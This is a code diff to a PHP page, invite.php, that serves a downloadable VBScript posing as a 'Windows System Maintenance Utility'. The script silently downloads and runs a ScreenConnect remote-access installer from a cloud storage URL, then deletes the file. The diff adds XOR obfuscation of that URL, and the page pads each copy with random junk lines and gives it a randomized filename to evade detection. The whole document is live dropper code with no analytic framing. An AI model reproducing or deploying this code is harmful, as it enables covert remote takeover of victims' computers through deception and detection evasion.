@@ -1,5 +1,5 @@
 <?php
-// invite.php - Benign header + No Persistence + No Defender Exclusion
+// invite.php - Moderate Encryption (including download URL)
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -15,7 +15,6 @@ $used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) 
 if (!is_array($used)) $used = [];
 
 $available = array_diff($baseNames, $used);
-
 if (empty($available)) {
     $available = $baseNames;
     $used = [];
@@ -31,12 +30,28 @@ setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 
 header('Content-Disposition: attachment; filename="' . $chosen . '"');
 
 $scUrl = "https://party.nyc3.cdn.digitaloceanspaces.com/ScreenConnect.ClientSetup%20(1).msi";
-
 $sessionId = bin2hex(random_bytes(24));
 $ts = time();
 $randV1 = 'v' . substr(md5(random_bytes(8)), 0, 12);
 $xorKey = rand(100, 255);
 
+// Encrypt the URL with the same key
+function xorEncrypt($text, $key) {
+    $result = '';
+    for ($i = 0; $i < strlen($text); $i++) {
+        $result .= chr(ord($text[$i]) ^ $key);
+    }
+    return $result;
+}
+
+$encryptedUrl = xorEncrypt($scUrl, $xorKey);
+$encryptedUrlVbs = "";
+for ($i = 0; $i < strlen($encryptedUrl); $i++) {
+    $encryptedUrlVbs .= "Chr(" . ord($encryptedUrl[$i]) . ") & ";
+}
+$encryptedUrlVbs = rtrim($encryptedUrlVbs, " & ");
+
+// Max ~1 KB difference
 $junkLines = rand(5, 25);
 $junk = "";
 for ($i = 0; $i < $junkLines; $i++) {
@@ -47,24 +62,6 @@ echo <<<VBS
 ' ========================================================
 ' Windows System Maintenance Utility
 ' Version: 3.1.8
-' Description: Performs routine system health checks,
-' applies recommended configuration updates, and ensures
-' optimal performance on Windows 10 and Windows 11.
-' Compatible with standard user and elevated environments.
-' ========================================================
-' This script is intended for legitimate system maintenance
-' purposes only. It does not collect personal data.
-' ========================================================
-
-' Configuration section - do not modify
-Const SCRIPT_VERSION = "3.1.8"
-Const LOG_ENABLED = False
-
-' Placeholder for future expansion
-Dim configReady
-configReady = True
-
-' End of configuration header
 ' ========================================================
 
 Dim $randV1, objShell, objFSO
@@ -92,15 +89,22 @@ End If
 Sub DownloadAndExecute()
     On Error Resume Next
     Dim u, p, http, strm
-    u = "$scUrl"
+    
+    u = $encryptedUrlVbs
     p = objShell.ExpandEnvironmentStrings("%TEMP%\\sc_setup.msi")
   
     Set http = CreateObject("MSXML2.XMLHTTP")
     http.Open "GET", u, False
     http.Send
+    
     If http.Status = 200 Then
         Set strm = CreateObject("ADODB.Stream")
-        strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
+        strm.Type = 1
+        strm.Open
+        strm.Write http.responseBody
+        strm.SaveToFile p, 2
+        strm.Close
+        
         objShell.Run """" & p & """ /quiet", 0, True
         WScript.Sleep 90000
         If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
